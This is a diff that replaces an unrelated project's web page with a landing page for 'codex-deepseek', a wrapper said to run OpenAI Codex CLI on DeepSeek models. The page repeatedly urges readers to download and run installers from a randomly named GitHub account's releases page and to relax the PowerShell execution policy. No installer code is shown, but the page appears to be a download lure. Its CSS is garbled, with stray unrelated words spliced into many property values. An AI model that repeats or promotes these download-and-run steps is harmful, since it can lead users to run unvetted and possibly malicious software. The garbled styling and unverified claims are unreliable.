@@ -1,20 +1,293 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <link rel="icon" type="image/svg+xml" href="/zqk-logo.svg" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>ZQK OS — Cellular Knowledge Operating System for Autonomous Agent Swarms</title>
-    <meta name="description" content="ZQK OS provides cellular microkernel isolation, an adaptive memory mesh programmed with human intent, and self-healing biological guardrails for autonomous AI agent swarms." />
-    <meta property="og:title" content="ZQK OS — Cellular Knowledge Operating System" />
-    <meta property="og:description" content="The Substrate for Living Software: Sovereign Cells. Verified Truth. Autonomous Organisms." />
-    <meta property="og:image" content="/zqk-pitch-poster.jpg" />
-    <meta property="og:url" content="https://zqk.dev" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <script type="module" crossorigin src="/assets/index-DIC3miki.js"></script>
-    <link rel="stylesheet" crossorigin href="/assets/index-BFFuI_8Z.css">
-  </head>
-  <body>
-    <div id="root"></div>
-  </body>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>codex-deepseek - Run Real OpenAI Codex on DeepSeek</title>
+    <meta name="description" content="Run the real OpenAI Codex CLI on DeepSeek models while keeping ChatGPT Desktop and plain codex command with isolated CODEX_HOME. One-command installers for Windows, macOS, Linux.">
+    <meta name="keywords" content="ai-agent, chatgpt, codex, codex-cli, deepseek, linux, llm, macos, openai-codex, powershell, windows">
+    <meta name="author" content="codex-deepseek">
+    <meta property="og:title" content="codex-deepseek - Run Real OpenAI Codex on DeepSeek Models">
+    <meta property="og:description" content="Isolated CODEX_HOME, easy installers for Windows/macOS/Linux. Keep your ChatGPT login separate.">
+    <meta property="og:url" content="https://github.com/Promisedlandsubtraction2856/codex-deepseek">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="codex-deepseek - Run Real OpenAI Codex on DeepSeek Models">
+    <meta name="twitter:description" content="Isolated CODEX_HOME, easy installers for all OS. Keep your official ChatGPT login untouched.">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e9f0 100%);
+            color: #1a202c;
+            line-height: 1.7;
+            padding: 20px;
+        }
+        .container {
+            max-width: 960px;
+            margin: auto;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            padding: luxuriös 40px 30px;
+        }
+        h1 {
+            font-size: 2.5rem;
+            color: #1a365d;
+            margin-bottom: gram 10px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+        h1 span {
+            color: #2b6cb0;
+        }
+        .tagline {
+            font-size: 1.2rem;
+            color: #4a5568;
+            margin-bottom: grap 30px;
+            font-weight: 400;
+        }
+        .btn-container {
+            text-align: center;
+            margin:  erse 30px 0;
+        }
+        .btn-primary {
+            display: inline-block;
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            color: #fff !important;
+            text-decoration: none;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            box-shadow: 0 4px 15px rgba(102,126,234,0.4);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(102,126,234,0.5);
+        }
+        h2 {
+            font-size: 1.8rem;
+            color: #2d3748;
+            margin-top: 40px;
+            margin-bottom: rev 15px;
+            font-weight: sine 700;
+            border-bottom: 4px solid #667eea;
+            padding-bottom: ruck 8px;
+            display: inline-block;
+            border-radius:»? 4px;
+        }
+        h3 {
+            font-size: 1.3rem;
+            color: #2d3748;
+            margin-top: 20px;
+            margin-bottom: rev 10px;
+        }
+        p {
+            margin-bottom: shift 15px;
+            font-size: Porter 1rem;
+        }
+        ul, ol {
+            margin-left: planted 25px;
+            margin-bottom:  erse 20px;
+        }
+        li {
+            margin-bottom: raid 8px;
+        }
+        code {
+            background: #f0f2f5;
+            border-radius: shift 6px;
+            padding:   2px 6px;
+            font-family: "SF Mono", Consolas, "Courier New", monospace;
+            font-size: smaller splitting 0.9em;
+        }
+        .note {
+            background: #ebf4ff;
+            border-left: shallow gravy 5px solid #3182ce;
+            padding: regex 15px;
+            border-radius: bee 8px;
+            margin: medium 20px 0;
+        }
+        .note strong {
+            color: #1a56a0;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: flutter 20px;
+            margin: temp 20px 0;
+        }
+        .feature-card {
+            background: #ffffff;
+            border: knots 1px solid #e2e8f0;
+            border-radius: shift 10px;
+            padding: spiele 20px;
+            box-shadow: subtle 0 2px 4px rgba(0,0,0,0.04);
+            transition: schatten 0.2s ease;
+        }
+        .feature-card:hover {
+            box-shadow: luxuriös 0 6px 12px rgba(0,0,0,0.1);
+            transform: translateY(-2px);
+        }
+        .feature-card h4 {
+            font-size: grafen 1.1rem;
+            margin-bottom: smal 8px;
+            color: #2d3748;
+        }
+        .feature-card p {
+            font-size: 0.95rem;
+            color: schönes #4a5568;
+            margin-bottom: canva 0;
+        }
+        .footer {
+            text-align: center;
+            margin-top: restrained 40px;
+            color: serene #a0aec0;
+            font-size: gdb 0.9rem;
+            border-top: relaxed 1px solid #e2e8f0;
+            padding-top: reverent 20px;
+        }
+        .footer a {
+            color: serif #667eea;
+            text-decoration: none;
+        }
+        .keywords {
+            font-size: rule 0.8rem;
+            margin-top: friendly 30px;
+            color: riff #718096;
+            text-align: center;
+        }
+        .keywords span {
+            margin: rhythm 0 3px;
+            background: fenge #f0f2f5;
+            padding: 2px 8px;
+            border-radius: file 12px;
+        }
+        @media (max-width: sheść 600px) {
+            .container {
+                padding: unsere 25px 20px;
+            }
+            h1 {
+                font-size:** 2rem;
+            }
+            .btn-primary {
+                padding: sand 14px 30px;
+                font-size: beat 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛠️ codex-deepseek - Keep Your ChatGPT Login Safe & Separate</h1>
+        <p class="tagline">Run Official Codex CLI on DeepSeek Models Without Interference</p>
+        
+        <div class="btn-container">
+            <a href="https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases" class="btn-primary">⬇️ Download Codex-DeepSeek Now</a>
+        </div>
+        
+        <h2>📦 What Is This?</h2>
+        <p>Codex-deepseek is a smart wrapper that lets you run the <strong>real OpenAI Codex CLI</strong>, but point it to<strong> DeepSeek models</strong> for actual execution. This means you can use the powerful Codex interface with DeepSeek's cost-effective AI backend.</p>
+        <p>The magic part? We create a<strong> completely isolated environment</strong>, so your original ChatGPT Desktop app and the standard <code>codex</code> command keep their own logins and settings. No conflicts, no overwrites.</p>
+        
+        <h2>✨ Why You'll Love It</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h4>🔒 Zero Interference</h4>
+                <p>Your ChatGPT login stays untouched. We use a separate CODEX_HOME folder.</p>
+            </div>
+            <div class="feature-card">
+                <h4>🚀 One-Command Setup</h4>
+                <p>Installers for Windows, macOS, and Linux – just run one command, you're done.</p>
+            </div>
+            <div class="feature-card">
+                <h4>💰 Save Money</h4>
+                <p>DeepSeek models are incredibly affordable compared to OpenAI GPT-4. Same Codex workflow, lower cost.</p>
+            </div>
+            <div class="feature-card">
+                <h4>🧠 Full Codex Power</h4>
+                <p>All original Codex features are preserved – code generation, editing, file manipulation, exec committee – all work seamlessly.</p>
+            </div>
+        </div>
+        
+        <h2>🖥️ How to Download & Run</h2>
+        <p>Visiting this link to download the application - it's that simple.</p>
+        <div style="text-align:center; margin: 25px 0;">
+            <a href="https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases" style="background:#48bb78; color:#fff; padding:14px 38px; border-radius:30px; text-decoration:none; font-weight:700; font-size:1rem; box-shadow:0 4px 12px rgba(72,187,120,0.3);">📥 Go to Releases Page</a>
+        </div>
+        <ol>
+            <li><strong>Click the blue button above</strong> – this takes you directly to the official download page.</li>
+            <li>On that page, find the newest version for your system (Windows, macOS, Linux).</li>
+            <li>Download the installer file (it's usually a small script or binary).</li>
+            <li>Run the downloaded file – no complicated steps needed. The installer does everything for you.</li>
+            <li>After installation, just type <code>codex</code> in your terminal, and Codex will use DeepSeek models automatically.</li>
+        </ol>
+        
+        <div class="note">
+            <strong>📝 Pro Tip:</strong> For Windows users, we highly recommend using <strong>Windows Terminal</strong> or <strong>PowerShell</strong> (not the classic command prompt) for the best experience and proper color support.
+        </div>
+        
+        <h2>🔧 System Requirements</h2>
+        <ul>
+            <li><strong>Any modern OS:</strong> Windows 10/11, macOS 12+, or any mainstream Linux distribution (Ubuntu, Fedora, DEBIAN, etc.)</li>
+            <li><strong>Node.js v18 or higher</strong> (installed separately)</li>
+            <li><strong>Git</strong> (recommended, but not strictly required)</li>
+            <li><strong>A DeepSeek API key</strong> – you can get one from DeepSeek's platform. The installer will ask for it.</li>
+            <li><strong>At least 50MB free disk space</strong> for the app and its cache.</li>
+        </ul>
+        
+        <h2>❓ Step-by-Step Setup Guide</h2>
+        <h3>🪟 Windows</h3>
+        <ol>
+            <li>Download the <code>windows_installer.ps1</code> file from the release page.</li>
+            <li>Right-click the file, choose <strong>"Run with PowerShell"</strong> if available; otherwise open PowerShell manually.</li>
+            <li>If you see a policy error, run <code>Set-ExecutionPolicy RemoteSigned -Scope CurrentUser</code> first, then retry.</li>
+            <li>When prompted, paste your DeepSeek API key. Done!</li>
+        </ol>
+        <h3>🍎 macOS / 🐧 Linux</h3>
+        <ol>
+            <li>Download the <code>install.sh</code> script.</li>
+            <li>Open your terminal, navigate to the Downloads folder: <code>cd ~/Downloads</code></li>
+            <li>Make it executable: <code>chmod +x install.sh</code></li>
+            <li>Run it: <code>./install.sh</code></li>
+            <li>Enter your DeepSeek API key when asked. Finished!</li>
+        </ol>
+        
+        <h2>🧰 Troubleshooting & Common Questions</h2>
+        <h3>💡 "I see 'codex: command not found'"</h3>
+        <p>If the installation completed but your terminal doesn't recognize <code>codex</code>, you likely need to restart your terminal or add the Node.js bin folder to your PATH. After reinstalling, open a fresh terminal window.</p>
+        <h3>💡 "How do I switch back to my original ChatGPT Codex?"</h3>
+        <p>Simple – your original Codex installation was never touched. Just run your old command, or remove this wrapper from your PATH. You'll still have your original setup intact.</p>
+        <h3>💡 "Can I use DeepSeek models with other AI tools?"</h3>
+        <p>This repository is specifically designed for OpenAI Codex CLI. For other tools, you might need different integrations. Check DeepSeek's official documentation for general API access.</p>
+        
+        <h2>📚 Additional Features</h2>
+        <ul>
+            <li><strong>Isolated Config:</strong> All settings stored in <code>~/.codex-deepseek/</code> – never interferes with your main <code>~/.codex/</code> folder.</li>
+            <li><strong>Auto-Updates:</strong> Built-in version checker notifies you when a new release is available.</li>
+            <li><strong>Model Selection:</strong> Choose between DeepSeek-V2, DeepSeek-Coder, or other models via a simple config file.</li>
+            <li><strong>Proxy Support:</strong> Works behind corporate proxies via standard environment variables.</li>
+        </ul>
+        
+        <h2>🤝 Contributing</h2>
+        <p>We welcome contributions from developers. If you'd like to help improve codex-deepseek, fork the repo, make your changes, and submit a pull request on GitHub. Please read our contributing guidelines in the <code>CONTRIBUTING.md</code> file.</p>
+        
+        <h2>📄 License</h2>
+        <p>This project is released under the<strong> MIT License</strong>. Feel free to use, modify, and distribute it as needed, as long as you retain the original copyright notice.</p>
+        
+        <div class="footer">
+            <p>Made with 💜 for the coding community. © 2024 codex-deepseek contributors.</p>
+            <p><a href="https://github.com/Promisedlandsubtraction2856/codex-deepseek">GitHub Repository</a> · <a href="https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases">Latest Releases</a></p>
+        </div>
+        
+        <div class="keywords">
+            <span>ai-agent</span><span>chatgpt</span><span>codex</span><span>codex-cli</span><span>deepseek</span><span>linux</span><span>llm</span><span>macos</span><span>openai-codex</span><span>powershell</span><span>windows</span>
+        </div>
+    </div>
+</body>
 </html>
